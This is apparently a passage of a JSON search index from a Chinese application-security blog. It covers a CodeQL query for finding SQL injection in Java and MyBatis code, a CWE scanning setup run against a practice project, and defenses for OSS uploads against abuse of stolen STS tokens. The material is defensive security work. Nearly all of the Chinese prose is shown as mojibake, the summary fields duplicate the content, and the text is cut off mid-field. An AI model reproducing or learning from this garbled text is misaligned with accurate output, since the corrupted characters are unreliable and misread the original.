å°„æ–‡ä»¶ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ï¼ˆåŒ…æ‹¬ \u0026lt;select\u0026gt; åŠå…¶åµŒå¥—çš„ \u0026lt;if\u0026gt;ã€\u0026lt;foreach\u0026gt; ç­‰åŠ¨æ€æ ‡ç­¾ï¼‰ï¼Œä¸€æ—¦å‘ç° ${} è¿™ç§ä¸å®‰å…¨å ä½ç¬¦ï¼Œä¾¿æå–è¯¥ SQL ç‰‡æ®µæ‰€å±çš„ namespaceï¼ˆç±»åï¼‰å’Œ idï¼ˆæ–¹æ³•åï¼‰ï¼Œåå‘å®šä½åˆ° Java ä»£ç ä¸­çš„ Mapper æ¥å£æ–¹æ³•ï¼›æ¥ç€ï¼Œé‰´äº Mapper æ¥å£é€šå¸¸æ— å®ä½“å®ç°ä¼šå¯¼è‡´æ•°æ®æµä¸­æ–­ï¼Œç­–ç•¥ä¸Šä¸å†è¯•å›¾è¿½è¸ªæ¥å£å†…éƒ¨ï¼Œè€Œæ˜¯ç›´æ¥ â€œåŠ«æŒâ€æ‰€æœ‰è°ƒç”¨è¯¥ Mapper æ–¹æ³•çš„ä»£ç ä½ç½®ï¼ˆMethodCallï¼‰ï¼Œå°†è°ƒç”¨å¤„ä¼ å…¥çš„å‚æ•°ç›´æ¥æ ‡è®°ä¸º Sinkï¼Œä»è€Œæ— è§†å¤æ‚çš„ä»£ç†æœºåˆ¶å’Œæ–­é“¾ï¼Œç²¾å‡†æ•è·ä» Controller æµå…¥è¿™äº›å±é™© XML æŸ¥è¯¢çš„æ±¡ç‚¹æ•°æ®ï¼š\nimport java import semmle.code.java.dataflow.TaintTracking import semmle.code.java.dataflow.FlowSources // å¼•å…¥å®˜æ–¹åº“ä»¥å¤ç”¨å…¶ç²¾å‡†å®šä¹‰ import semmle.code.java.security.SqlInjectionQuery // [æ–°å¢] å¼•å…¥ XML åº“ä»¥è§£æ MyBatis Mapper æ–‡ä»¶ import semmle.code.xml.XML module RobustSqlInjectionConfig implements DataFlow::ConfigSig { // 1. Source: è¿œç¨‹è¾“å…¥ predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } // 2. Sink: æ··åˆç­–ç•¥ predicate isSink(DataFlow::Node sink) { // A. å®˜æ–¹Sink sink instanceof QueryInjectionSink or // B. æ¨¡ç³Šç±»å‹ Sink è§£å†³ä¾èµ–ç¼ºå¤±å¯¼è‡´ç±»å‹æ— æ³•è§£æçš„é—®é¢˜ exists(MethodCall mc | mc.getMethod().getName() in [ \u0026#34;createQuery\u0026#34;, \u0026#34;createNativeQuery\u0026#34;, \u0026#34;createSQLQuery\u0026#34;, // JPA/Hibernate \u0026#34;executeQuery\u0026#34;, \u0026#34;executeUpdate\u0026#34;, \u0026#34;execute\u0026#34; // JDBC ] and ( // ä½¿ç”¨ matches å®¹å¿åŒ…åè§£æå¤±è´¥ mc.getQualifier().getType().getName().matches(\u0026#34;%Session%\u0026#34;) or // Hibernate Session mc.getQualifier().getType().getName().matches(\u0026#34;%EntityManager%\u0026#34;) or // JPA EntityManager mc.getQualifier().getType().getName().matches(\u0026#34;%Query%\u0026#34;) or // Query, TypedQuery mc.getQualifier().getType().getName().matches(\u0026#34;%Statement%\u0026#34;) or // Statement, PreparedStatement mc.getQualifier().getType().getName().matches(\u0026#34;%Template%\u0026#34;) // JdbcTemplate, HibernateTemplate ) and sink.asExpr() = mc.getArgument(0) ) or // C. MyBatis æ³¨è§£ Sink (@Select(\u0026#34;${name}\u0026#34;) åœºæ™¯) exists(Annotation ann | ann.getType().hasName([\u0026#34;Select\u0026#34;, \u0026#34;Update\u0026#34;, \u0026#34;Insert\u0026#34;, \u0026#34;Delete\u0026#34;]) and exists(string sql, Method method, Parameter param | // 1. è·å–æ³¨è§£é‡Œçš„ SQL è¯­å¥ sql = ann.getValue(\u0026#34;value\u0026#34;).(StringLiteral).getValue() and // 2. æ‰¾åˆ° ${} æ¨¡å¼ sql.matches(\u0026#34;%${\u0026#34; + param.getName() + \u0026#34;}%\u0026#34;) and // 3. å…³è”å›æ–¹æ³•å‚æ•° method = ann.getTarget() and param = method.getParameter(_) and sink.asParameter() = param ) ) or // D. MyBatis Mapper è°ƒç”¨ Sink (ç›´æ¥æ ‡è®°è°ƒç”¨ç‚¹ï¼Œè§£å†³ Interface æ— å®ç°å¯¼è‡´çš„æ•°æ®æµæ–­é“¾é—®é¢˜) exists(MethodCall mc, Method method, Parameter param | // åªè¦æ–¹æ³•åä¸€è‡´ï¼Œä¸”å£°æ˜ç±»ååŒ…å« XML namespace çš„æœ€åä¸€éƒ¨åˆ† (ç±»å) mc.getMethod().getName() = method.getName() and method.getDeclaringType().getQualifiedName().matches(\u0026#34;%\u0026#34; + mc.getMethod().getDeclaringType().getName()) and // ç¡®ä¿è¿™ä¸ª method ç¡®å®æ˜¯ XML é‡Œé‚£ä¸ªæœ‰æ¼æ´çš„æ–¹æ³• isMyBatisXmlSink(method, param) and // æ ‡è®°è°ƒç”¨ç‚¹çš„å‚æ•°ä¸º Sink sink.asExpr() = mc.getArgument(param.getPosition()) ) } // 3. æ–­é“¾ä¿®å¤ (å¢å¼ºæ±¡ç‚¹æµè½¬) predicate isAdditionalFlowStep(DataFlow::Node pred, DataFlow::Node succ) { // å­—ç¬¦ä¸²æ‹¼æ¥ (+) exists(AddExpr add | add.getAnOperand() = pred.asExpr() and succ.asExpr() = add ) or // StringBuilder/Buffer exists(MethodCall mc | mc.getMethod().getName() = \u0026#34;append\u0026#34; and mc.getQualifier().getType().getName().matches(\u0026#34;%Builder\u0026#34;) and // æ¨¡ç³ŠåŒ¹é… StringBuilder ( mc.getArgument(0) = pred.asExpr() and succ.asExpr() = mc or pred.asExpr() = mc.getQualifier() and succ.asExpr() = mc ) ) } // 4. å‡å°‘è¯¯æŠ¥ predicate isBarrier(DataFlow::Node node) { node.getType() instanceof PrimitiveType and not node.getType().hasName(\u0026#34;char\u0026#34;) and not node.getType().hasName(\u0026#34;byte\u0026#34;) } } module RobustSqlFlow = TaintTracking::Global\u0026lt;RobustSqlInjectionConfig\u0026gt;; import RobustSqlFlow::PathGraph from RobustSqlFlow::PathNode source, RobustSqlFlow::PathNode sink where RobustSqlFlow::flowPath(source, sink) select sink.getNode(), source, sink, \u0026#34;SQL Injection detected (Robust Mode)\u0026#34; // è¾…åŠ©è°“è¯ï¼šè§£æ MyBatis XML æŸ¥æ‰¾æ³¨å…¥ç‚¹ (ç§»åˆ° Module å¤–éƒ¨) predicate isMyBatisXmlSink(Method method, Parameter param) { exists(XmlElement mapper, XmlElement sqlTag, string namespace, string id, XmlCharacters chars | // 1. æ‰¾åˆ° \u0026lt;mapper\u0026gt; æ ‡ç­¾åŠå…¶ namespace mapper.getName() = \u0026#34;mapper\u0026#34; and namespace = mapper.getAttribute(\u0026#34;namespace\u0026#34;).getValue() and // 2. æ‰¾åˆ° \u0026lt;select/insert/update/delete\u0026gt; æ ‡ç­¾åŠå…¶ id sqlTag.getParent() = mapper and sqlTag.getName() in [\u0026#34;select\u0026#34;, \u0026#34;insert\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;delete\u0026#34;] and id = sqlTag.getAttribute(\u0026#34;id\u0026#34;).getValue() and // 3. ä¸ç›´æ¥å– sqlTag.getTextValue()ï¼Œè€Œæ˜¯é€’å½’æŸ¥æ‰¾è¯¥æ ‡ç­¾ä¸‹çš„ä»»æ„å­æ ‡ç­¾ (XmlElement)ï¼ŒåŒ…æ‹¬è‡ªå·±ï¼Œè¿™æ ·å¯ä»¥è¦†ç›– \u0026lt;if\u0026gt;, \u0026lt;foreach\u0026gt; ç­‰åŠ¨æ€æ ‡ç­¾å†…çš„æ–‡æœ¬ exists(XmlElement subTag | (subTag = sqlTag or subTag.getParent+() = sqlTag) and subTag.getTextValue().indexOf(\u0026#34;${\u0026#34;) \u0026gt;= 0 and // 4. æå–åŒ…å« ${} çš„é‚£æ®µæ–‡æœ¬ exists(string content | content = subTag.getTextValue() | // 5. æ˜ å°„å› Java æ–¹æ³• (Namespace -\u0026gt; Class, ID -\u0026gt; Method) method.getDeclaringType().getQualifiedName() = namespace and method.getName() = id and // 6. ç®€å•çš„å‚æ•°åŒ¹é… param = method.getParameter(_) and ( // æƒ…å†µ A: å‚æ•°åç²¾å‡†åŒ¹é… content.indexOf(\u0026#34;${\u0026#34; + param.getName() + \u0026#34;}\u0026#34;) \u0026gt;= 0 or // æƒ…å†µ B: å…œåº• content.length() \u0026gt; 0 ) ) ) ) } è¿™æ ·å°±å¯ä»¥æŠŠä»£ç ä¸Šæ‰€æœ‰çš„SQLæ³¨å…¥åœºæ™¯éƒ½æ•è·äº†:\næ€»ç»“ åœ¨å†™è§„åˆ™çš„è¿‡ç¨‹ä¸­ï¼Œä¿è¯æ¼æ´åŒ¹é…çš„æƒ…å†µä¸‹ï¼Œä¼šé€‚å½“çš„æ”¾å®½æ¡ä»¶ï¼Œå› ä¸ºæ¼æŠ¥è¿œæ¯”è¯¯æŠ¥æ›´ä¸¥é‡ï¼Œå†µä¸”è¯¯æŠ¥æ˜¯å¯ä»¥é LLMã€äººå·¥å®¡æ ¸è¿›è¡Œé™å™ªçš„ï¼Œè¿™æ ·ä¼šè®©æ¼æ´è¦†ç›–æ›´å®Œæ•´\n",
        "summary": "ä½¿ç”¨CodeQLè¿›è¡Œç™½ç›’æ‰«æ æ¥ä¸‹æ¥å­¦ç‚¹ä¸ä¸€æ ·çš„ï¼Œä»ä¼ä¸šå®‰å…¨å»ºè®¾è§’åº¦å‡ºå‘ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šæ ¹æ®codeQLæä¾›çš„çš„CWEæ¼æ´è§„åˆ™ï¼Œé’ˆå¯¹ä»£ç è¿›è¡Œæ‰«æï¼Œæˆ‘ä»¬é€‰å–ä»¥ä¸‹CWEè§„åˆ™ï¼š\nã€æ³¨å…¥ç±»ã€‘ - SQL Injection (089) - XSS (079) - Command Exec (078) - Expression / Code Injection (094) - SSRF (918) - XXE (611) ã€èµ„æºè®¿é—®ç±»ã€‘ - Path Traversal (22) ã€ååºåˆ—åŒ–ã€‘ - Unsafe Deserialization (502) ã€è®¤è¯æˆæƒã€‘ - Authentication Bypass (287) - Authorization Bypass (807) ã€æ•æ„Ÿä¿¡æ¯ã€‘ - Hardcoded Credentials (798) æ¥ä¸‹æ¥ä»¥https://github.com/whgojp/JavaSecLab/é¡¹ç›®ä¸ºä¾‹\nSQLæ³¨å…¥ æˆ‘ä»¬ä½¿ç”¨codeqlå®˜æ–¹çš„è§„åˆ™è¿›è¡Œsqlæ³¨å…¥æ‰«æï¼ˆè®°å¾—å…ˆæ„å»ºæ•°æ®åº“ï¼‰ï¼š\ncodeql database analyze ~/tools/CodeQL/db/javasecpro \\ codeql/java-queries:Security/CWE/CWE-089 \\ --format=sarif-latest \\ --output=sql.sarif å¯ä»¥çœ‹åˆ°æ‰«æå®Œæˆååœ¨æ–‡ä»¶å¤¹æ–°å¢äº†ä¸€ä¸ªsarifæ–‡ä»¶ï¼Œè¿™ä¸ªå°±æ˜¯æ‰«æç»“æœæ–‡ä»¶ï¼Œå¯ä»¥åœ¨vscodeä¸‹è½½sarif vieweræ’ä»¶è¿›è¡Œè§£ææŸ¥çœ‹ï¼š "
    }
,
    {
        "title": "OSSæ–‡ä»¶ä¸Šä¼ ä¸é»‘ç°äº§å¯¹æŠ—",
        "link": "/My-Knowlege-Database/blog/sdl/oss%E6%B2%BB%E7%90%86/oss%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E9%BB%91%E7%81%B0%E4%BA%A7%E5%AF%B9%E6%8A%97/",
        "content": "OSSæ–‡ä»¶ä¸Šä¼ ä¸é»‘ç°äº§å¯¹æŠ— æ¥ä¸‹æ¥å›´ç»•ä¼ä¸šå¯¹äºéœ€è¦OSSçš„ä¸šåŠ¡å»ºè®¾è¿›è¡Œåˆ†æä¸å­¦ä¹ \nåŸºç¡€ STS Token STS(Security Token Service)æ˜¯äº‘å‚å•†æä¾›çš„ä¸€ç§ä¸´æ—¶è®¿é—®æƒé™ç®¡ç†æœåŠ¡ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥æœåŠ¡ç”³è¯·ä¸´æ—¶çš„å®‰å…¨ä»¤ç‰Œæ¥è®¿é—®äº‘å‚å•†èµ„æºï¼ŒSTS Tokençš„ä¼˜åŠ¿å¦‚ä¸‹ï¼š\nå‡å°‘é•¿æœŸè®¿é—®å¯†é’¥çš„æ³„æ¼é£é™© STS Tokenå…·æœ‰å®æ•ˆæ€§ï¼Œå¯ä»¥è‡ªå®šä¹‰å¤±æ•ˆæ—¶é—´ï¼Œæ— éœ€å®šæœŸè½®æ¢ å¯ä»¥ç»™STS Tokenç»‘å®šè‡ªå®šä¹‰æƒé™ç­–ç•¥ï¼Œäº‘èµ„æºæˆæƒæ›´çµæ´» å¼€å‘ä¸­çš„ä½¿ç”¨ ä¸€èˆ¬æ¥è¯´ï¼Œæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹ï¼Œä¸šå†…æˆç†Ÿçš„æ–¹æ¡ˆæ˜¯å®¢æˆ·ç«¯ä¸Šä¼ ï¼Œå³å‰ç«¯ç›´ä¼ OSSï¼Œæ–‡ä»¶ä¸ç”¨ç»è¿‡åç«¯æœåŠ¡å™¨ï¼Œè¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šèƒ½å¤Ÿå‡å°‘æœåŠ¡å¸¦å®½ï¼Œæå‡ç”¨æˆ·ä½“éªŒ\nç®€å•æ¦‚æ‹¬ä¸€ä¸‹è¿™ä¸ªæ–¹æ¡ˆï¼šå‰ç«¯å‘åç«¯ç”³è¯·ä¸€ä¸ªä¸´æ—¶çš„STS Tokenï¼Œå‰ç«¯å†ä½¿ç”¨è¯¥Tokenç›´æ¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°OSS\næ›´è¯¦ç»†çš„å®è·µå¯ä»¥å‚è€ƒé˜¿é‡Œäº‘å®˜æ–¹æ–‡æ¡£ï¼šhttps://help.aliyun.com/zh/oss/user-guide/uploading-objects-to-oss-directly-from-clients/\nå€¼å¾—ä¸€æçš„æ˜¯ï¼Œé™¤äº†è¿™ä¸ªæ–¹æ¡ˆï¼Œé˜¿é‡Œäº‘å®˜æ–¹è¿˜æä¾›äº†ä¸¤ä¸ªå®¢æˆ·ç«¯ç›´ä¼ æ–¹æ¡ˆï¼Œä¸è¿‡ç”±äºä¸æ”¯æŒå¤§æ–‡ä»¶åˆ†ç‰‡ä»¥åŠæ–­ç‚¹ç»­ä¼ ï¼Œæ‰€ä»¥ä½¿ç”¨çš„è¾ƒå°‘ï¼š å®‰å…¨é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ç§æƒ…å†µå­˜åœ¨å¦‚ä¸‹çš„é£é™©ï¼š é»‘ç°äº§å¯ä»¥é€šè¿‡æŠ“åŒ…è·å–åˆ°STS Tokenï¼Œå†ä½¿ç”¨é˜¿é‡Œäº‘çš„SDKç›´æ¥ä¸Šä¼ æ–‡ä»¶åˆ°OSSï¼Œè¿™æ ·ä¸Šä¼ æ–‡ä»¶ä¸ä¼šç»è¿‡é£æ§å®¡æ ¸ï¼Œå¹¶ä¸”å¯ä»¥è·å–åˆ°OSSä¸Šå­˜å‚¨æ–‡ä»¶çš„é“¾æ¥ï¼Œè¿›è¡Œä¼ æ’­ï¼Œç”šè‡³æ˜¯æ¶ˆè€—å…¬å¸çš„CDNèµ„æºæ¥åŠ è½½ä»–ä»¬ä¸Šä¼ çš„è§†é¢‘æ–‡ä»¶\næ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿä¸é»‘ç°äº§å¯¹æŠ—ä¸»è¦æ˜¯è¦æå‡é»‘ç°äº§çš„åˆ©ç”¨æˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ä»å¤šæ–¹é¢æ¥æ€è€ƒï¼Œæœ€åŸºæœ¬çš„å°±æ˜¯ï¼šå…¬å¸å†…åº”å½“ç»Ÿä¸€åšå¥½ä¸Šä¼ åŠŸèƒ½çš„ç®¡ç†ï¼Œè§„èŒƒä¸€å¥—ç¬¦åˆå…¬å¸æ ‡å‡†çš„æ–‡ä»¶ä¸Šä¼ SDKï¼Œå¦‚æœéœ€è¦ç”¨åˆ°å­˜å‚¨æ¡¶ä¸Šä¼ åŠŸèƒ½çš„è¯ï¼Œå¯ä»¥åˆ°OSSç®¡ç†å¹³å°ç”³è¯·ï¼Œå¹¶ä¸”åŠŸèƒ½ç»‘å®šåˆ°APP IDä¸Šï¼Œå¹¶ä¸”æ¥å…¥æ—¶é‰´æƒåˆ°ä½\nå¦å¤–è¿˜èƒ½ä»ä¸Šä¼ é€»è¾‘ä¸STS Tokenç®¡ç†ä¸Šæ¥æ€è€ƒ\nä¸Šä¼ é€»è¾‘å±‚é¢ ä»é€»è¾‘å±‚é¢ä¸Šï¼Œä¸€ä¸ªç»å…¸çš„æ–¹æ¡ˆæ˜¯äºŒæ¬¡æäº¤ï¼š æˆ‘ä»¬æ€è€ƒå­˜åœ¨æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œå¤´åƒä¸Šä¼ ã€ é—®å·æäº¤ã€å¯Œæ–‡æœ¬ç¼–è¾‘\u0026hellip;ä¸éš¾å‘ç°ï¼Œè¿™äº›åŠŸèƒ½åœ¨ä¸Šä¼ äº†å›¾ç‰‡ä¹‹åé€šå¸¸éœ€è¦äºŒæ¬¡ç‚¹å‡»ç¡®å®šï¼Œæäº¤è¡¨å•æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸€ç‚¹æ¥è®¾é˜²ï¼š\né¦–å…ˆæ˜¯ä¸Šä¼ å›¾ç‰‡ï¼Œä¸Šä¼ ä¹‹åè¿”å›å›¾ç‰‡urlåœ°å€ï¼Œæ­¤æ—¶çš„åœ°å€æ˜¯æ— æ³•è®¿é—®çš„ï¼Œå¯¹åº”å­˜å‚¨æ¡¶çš„å›¾ç‰‡æƒé™ä¸ºç§æœ‰ï¼ˆä¾‹å¦‚x-oss-object-acl:privateï¼‰ï¼Œå‰ç«¯ä»…ä½¿ç”¨æœ¬åœ°ç¼“å­˜æ¥å±•ç¤ºå›¾ç‰‡é¢„è§ˆ ç„¶åæ˜¯ç‚¹å‡»ç¡®è®¤ï¼Œæäº¤æ•°æ®è¡¨å•ï¼Œåç«¯æå‰å½•å…¥å¥½è¿™ä¸ªæ¥å£çš„å“åº”ï¼Œåœ¨æäº¤è¡¨å•æˆåŠŸåï¼Œæ¥å£æ­£ç¡®å“åº”ï¼Œæ­¤æ—¶åç«¯ä¼šä¿®æ”¹ä¸Šä¼ çš„èµ„æºçš„æƒé™ä¸ºdefautï¼Œæ­¤æ—¶æ‰å¯ä»¥æ ¹æ®urlåœ°å€è¿›è¡Œè®¿é—® é‚£ä¹ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿é»‘ç°äº§ä½¿ç”¨SDKä¸Šä¼ å¤§é‡æ–‡ä»¶ï¼Œä¹Ÿæ˜¯ä¸å¯è®¿é—®çš„ï¼Œè€Œå¦‚æœé»‘ç°äº§æƒ³è¦åˆ©ç”¨ä¸šåŠ¡æ¥å£æ¥ä¿®æ”¹æ–‡ä»¶æƒé™ï¼Œå°±éœ€è¦å¤§é‡è¯·æ±‚ï¼Œå°†ä¼šè§¦å‘ä¸šåŠ¡å‘Šè­¦ï¼Œè¿™æ ·ä¸€æ¥å°±å¤§å¹…å¢åŠ äº†é»‘ç°äº§çš„åˆ©ç”¨æˆæœ¬\nSTS Tokenå±‚é¢ æ—¢ç„¶é»‘ç°äº§æ˜¯é€šè¿‡è·å–STS Tokenæ¥è¿›è¡Œä¸Šä¼ åˆ©ç”¨ï¼Œé‚£æˆ‘ä»¬ä¹Ÿå¯ä»¥ä»STS Tokenå±‚é¢æ¥å…¥æ‰‹ï¼Œåšå¦‚ä¸‹è€ƒé‡ï¼š\né¦–å…ˆæ˜¯è·å–STS Tokençš„æ¥å£ï¼Œä¸ºäº†é˜²æ­¢è¯¥æ¥å£è¢«æ»¥ç”¨ï¼Œéœ€è¦æ¥å…¥é£æ§ï¼Œå¼‚å¸¸è°ƒç”¨åˆ™è§¦å‘ä¸šåŠ¡å‘Šè­¦ å…¶æ¬¡ï¼Œè™½ç„¶STS Tokené™åˆ¶äº†æœ‰æ•ˆæœŸï¼Œä½†ä»éœ€è¦å¯¹å…¶å¢åŠ é™åˆ¶ï¼Œæ¯”å¦‚å®¢æˆ·ç«¯è·å–STS Tokenæ—¶éœ€è¦å¢åŠ ä¸€ä¸ªfileNameå‚æ•°ï¼Œå¹¶ä¸”ä½¿ç”¨è¯¥Tokenå›ºå®šåªèƒ½ä¸Šä¼ è¿™ä¸ªæŒ‡å®šçš„æ–‡ä»¶åï¼Œè¿™æ ·ä¸€æ¥ï¼Œä¸è®ºå¤šå°‘æ¬¡ä¸Šä¼ éƒ½åªæ˜¯è¦†ç›–åŒä¸€æ–‡ä»¶ï¼Œé™ä½äº†é£é™© ",
        "summary": "OSSæ–‡ä»¶ä¸Šä¼ ä¸é»‘ç°äº§å¯¹æŠ— æ¥ä¸‹æ¥å›´ç»•ä¼ä¸šå¯¹äºéœ€è¦OSSçš„ä¸šåŠ¡å»ºè®¾è¿›è¡Œåˆ†æä¸å­¦ä¹ \nåŸºç¡€ STS Token STS(Security Token Service)æ˜¯äº‘å‚å•†æä¾›çš„ä¸€ç§ä¸´æ—¶è®¿é—®æƒé™ç®¡ç†æœåŠ¡ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥æœåŠ¡ç”³è¯·ä¸´æ—¶çš„å®‰å…¨ä»¤ç‰Œæ¥è®¿é—®äº‘å‚å•†èµ„æºï¼ŒSTS Tokençš„ä¼˜åŠ¿å¦‚ä¸‹ï¼š\nå‡å°‘é•¿æœŸè®¿é—®å¯†é’¥çš„æ³„æ¼é£é™© STS Tokenå…·æœ‰å®æ•ˆæ€§ï¼Œå¯ä»¥è‡ªå®šä¹‰å¤±æ•ˆæ—¶é—´ï¼Œæ— éœ€å®šæœŸè½®æ¢ å¯ä»¥ç»™STS Tokenç»‘å®šè‡ªå®šä¹‰æƒé™ç­–ç•¥ï¼Œäº‘èµ„æºæˆæƒæ›´çµæ´» å¼€å‘ä¸­çš„ä½¿ç”¨ ä¸€èˆ¬æ¥è¯´ï¼Œæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹ï¼Œä¸šå†…æˆç†Ÿçš„æ–¹æ¡ˆæ˜¯å®¢æˆ·ç«¯ä¸Šä¼ ï¼Œå³å‰ç«¯ç›´ä¼ OSSï¼Œæ–‡ä»¶ä¸ç”¨ç»è¿‡åç«¯æœåŠ¡å™¨ï¼Œè¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šèƒ½å¤Ÿå‡å°‘æœåŠ¡å¸¦å®½ï¼Œæå‡ç”¨æˆ·ä½“éªŒ\nç®€å•æ¦‚æ‹¬ä¸€ä¸‹è¿™ä¸ªæ–¹æ¡ˆï¼šå‰ç«¯å‘åç«¯ç”³è¯·ä¸€ä¸ªä¸´æ—¶çš„STS Tokenï¼Œå‰ç«¯å†ä½¿ç”¨è¯¥Tokenç›´æ¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°OSS\næ›´è¯¦ç»†çš„å®è·µå¯ä»¥å‚è€ƒé˜¿é‡Œäº‘å®˜æ–¹æ–‡æ¡£ï¼šhttps://help.aliyun.com/zh/oss/user-guide/uploading-objects-to-oss-directly-from-clients/\nå€¼å¾—ä¸€æçš„æ˜¯ï¼Œé™¤äº†è¿™ä¸ªæ–¹æ¡ˆï¼Œé˜¿é‡Œäº‘å®˜æ–¹è¿˜æä¾›äº†ä¸¤ä¸ªå®¢æˆ·ç«¯ç›´ä¼ æ–¹æ¡ˆï¼Œä¸è¿‡ç”±äºä¸æ”¯æŒå¤§æ–‡ä»¶åˆ†ç‰‡ä»¥åŠæ–­ç‚¹ç»­ä¼ ï¼Œæ‰€ä»¥ä½¿ç”¨çš„è¾ƒå°‘ï¼š å®‰å…¨é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ç§æƒ…å†µå­˜åœ¨å¦‚ä¸‹çš„é£é™©ï¼š é»‘ç°äº§å¯ä»¥é€šè¿‡æŠ“åŒ…è·å–åˆ°STS Tokenï¼Œå†ä½¿ç”¨é˜¿é‡Œäº‘çš„SDKç›´æ¥ä¸Šä¼ æ–‡ä»¶åˆ°OSSï¼Œè¿™æ ·ä¸Šä¼ æ–‡ä»¶ä¸ä¼šç»è¿‡é£æ§å®¡æ ¸ï¼Œå¹¶ä¸”å¯ä»¥è·å–åˆ°OSSä¸Šå­˜å‚¨æ–‡ä»¶çš„é“¾æ¥ï¼Œè¿›è¡Œä¼ æ’­ï¼Œç”šè‡³æ˜¯æ¶ˆè€—å…¬å¸çš„CDNèµ„æºæ¥åŠ è½½ä»–ä»¬ä¸Šä¼ çš„è§†é¢‘æ–‡ä»¶\næ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿä¸é»‘ç°äº§å¯¹æŠ—ä¸»è¦æ˜¯è¦æå‡é»‘ç°äº§çš„åˆ©ç”¨æˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ä»å¤šæ–¹é¢æ¥æ€è€ƒï¼Œæœ€åŸºæœ¬çš„å°±æ˜¯ï¼šå…¬å¸å†…åº”å½“ç»Ÿä¸€åšå¥½ä¸Šä¼ åŠŸèƒ½çš„ç®¡ç†ï¼Œè§„èŒƒä¸€å¥—ç¬¦åˆå…¬å¸æ ‡å‡†çš„æ–‡ä»¶ä¸Šä¼ SDKï¼Œå¦‚æœéœ€è¦ç”¨åˆ°å­˜å‚¨æ¡¶ä¸Šä¼ åŠŸèƒ½çš„è¯ï¼Œå¯ä»¥åˆ°OSSç®¡ç†å¹³å°ç”³è¯·ï¼Œå¹¶ä¸”åŠŸèƒ½ç»‘å®šåˆ°APP IDä¸Šï¼Œå¹¶ä¸”æ¥å…¥æ—¶é‰´æƒåˆ°ä½\nå¦å¤–è¿˜èƒ½ä»ä¸Šä¼ é€»è¾‘ä¸STS Tokenç®¡ç†ä¸Šæ¥æ€è€ƒ\nä¸Šä¼ é€»è¾‘å±‚é¢ ä»é€»è¾‘å±‚é¢ä¸Šï¼Œä¸€ä¸ªç»å…¸çš„æ–¹æ¡ˆæ˜¯äºŒæ¬¡æäº¤ï¼š æˆ‘ä»¬æ€è€ƒå­˜åœ¨æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œå¤´åƒä¸Šä¼ ã€ é—®å·æäº¤ã€å¯Œæ–‡æœ¬ç¼–è¾‘\u0026hellip;ä¸éš¾å‘ç°ï¼Œè¿™äº›åŠŸèƒ½åœ¨ä¸Šä¼ äº†å›¾ç‰‡ä¹‹åé€šå¸¸éœ€è¦äºŒæ¬¡ç‚¹å‡»ç¡®å®šï¼Œæäº¤è¡¨å•æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸€ç‚¹æ¥è®¾é˜²ï¼š\né¦–å…ˆæ˜¯ä¸Šä¼ å›¾ç‰‡ï¼Œä¸Šä¼ ä¹‹åè¿”å›å›¾ç‰‡urlåœ°å€ï¼Œæ­¤æ—¶çš„åœ°å€æ˜¯æ— æ³•è®¿é—®çš„ï¼Œå¯¹åº”å­˜å‚¨æ¡¶çš„å›¾ç‰‡æƒé™ä¸ºç§æœ‰ï¼ˆä¾‹å¦‚x-oss-object-acl:privateï¼‰ï¼Œå‰ç«¯ä»…ä½¿ç”¨æœ¬åœ°ç¼“å­˜æ¥å±•ç¤ºå›¾ç‰‡é¢„è§ˆ ç„¶åæ˜¯ç‚¹å‡»ç¡®è®¤ï¼Œæäº¤æ•°æ®è¡¨å•ï¼Œåç«¯æå‰å½•å…¥å¥½è¿™ä¸ªæ¥å£çš„å“åº”ï¼Œåœ¨æäº¤è¡¨å•æˆåŠŸåï¼Œæ¥å£æ­£ç¡®å“åº”ï¼Œæ­¤æ—¶åç«¯ä¼šä¿®æ”¹ä¸Šä¼ çš„èµ„æºçš„æƒé™ä¸ºdefautï¼Œæ­¤æ—¶æ‰å¯ä»¥æ ¹æ®urlåœ°å€è¿›è¡Œè®¿é—® é‚£ä¹ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿é»‘ç°äº§ä½¿ç”¨SDKä¸Šä¼ å¤§é‡æ–‡ä»¶ï¼Œä¹Ÿæ˜¯ä¸å¯è®¿é—®çš„ï¼Œè€Œå¦‚æœé»‘ç°äº§æƒ³è¦åˆ©ç”¨ä¸šåŠ¡æ¥å£æ¥ä¿®æ”¹æ–‡ä»¶æƒé™ï¼Œå°±éœ€è¦å¤§é‡è¯·æ±‚ï¼Œå°†ä¼šè§¦å‘ä¸šåŠ¡å‘Šè­¦ï¼Œè¿™æ ·ä¸€æ¥å°±å¤§å¹…å¢åŠ äº†é»‘ç°äº§çš„åˆ©ç”¨æˆæœ¬\nSTS Tokenå±‚é¢ æ—¢ç„¶é»‘ç°äº§æ˜¯é€šè¿‡è·å–STS Tokenæ¥è¿›è¡Œä¸Šä¼ åˆ©ç”¨ï¼Œé‚£æˆ‘ä»¬ä¹Ÿå¯ä»¥ä»STS 